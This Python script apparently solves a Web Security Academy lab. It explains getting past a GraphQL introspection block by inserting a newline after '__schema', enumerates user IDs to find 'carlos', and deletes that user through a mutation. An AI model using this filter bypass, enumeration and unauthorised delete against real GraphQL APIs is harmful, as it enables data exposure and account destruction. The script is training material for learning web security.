from web_security_academy.core.logger import logger

import json


def solve_lab(session):
    logger.info('Hidden GraphQL endpoint located at "/api"')
    logger.info('Finding the ID of user "carlos"...')

    # __schema{ is blacklisted, but __schema isn't. Therefore, I was able to
    # send introspection queries by putting a newline in between "__schema"
    # and "{". By sending a full introspection query, I found the mutation
    # "deleteOrganizationUser", which takes a user ID as an argument. I also
    # found the query "getUser", which also takes a user ID as an argument

    i = 1
    while True:
        query = {"query": "query { getUser(id: " + str(i) + ") { username }}"}
        resp = session.get_path("/api", json=query)
        resp = json.loads(resp.text)
        username = resp["data"]["getUser"]["username"]

        if username == "carlos":
            logger.success(f"{i} -> {username}")
            break
        else:
            logger.info(f"{i} -> {username}")
            i += 1

    # mutation {
    #     deleteOrganizationUser(input: { id: <i> }) {
    #         user {
    #             username
    #         }
    #     }
    # }
    query = {
        "query": "mutation { deleteOrganizationUser(input: { id:"
        + f" {i} "
        + "}) { user { username } }}"
    }

    logger.info('Deleting user "carlos"...')
    resp = session.get_path("/api", json=query)
    resp = json.loads(resp.text)
    logger.info(f"Query result: {resp}")
